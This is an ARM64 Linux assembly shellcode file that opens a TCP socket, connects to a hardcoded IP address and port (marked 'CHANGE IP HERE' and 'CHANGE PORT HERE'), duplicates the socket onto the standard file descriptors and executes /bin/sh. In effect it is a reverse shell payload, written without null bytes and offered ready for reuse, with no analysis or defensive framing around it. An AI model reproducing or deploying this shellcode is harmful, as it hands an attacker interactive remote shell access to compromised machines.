.section .text
.global _start
_start:

    mov  x8, #198
    lsr  x1, x8, #7
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337


    mvn  x4, x0


    lsl  x1, x1, #1

    
	/*
    CHANGE PORT HERE
    */
    movk x1, #0x5C11, lsl #16 

    
    /*
    CHANGE IP HERE
    */
    movk x1, #0xa8c0, lsl #32 
    movk x1, #0xd41d, lsl #48
    
    str  x1, [sp, #-8]!
    add  x1, sp, x2
    mov  x2, #16
    mov  x8, #203
    svc  #0x1337

    lsr  x1, x2, #2

dup3:

    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3


    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48

	// Align the stack pointer to 16 bytes
	sub  sp, sp, #8

	// Store the value with proper alignment
	str  x3, [sp, #-8]!


    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337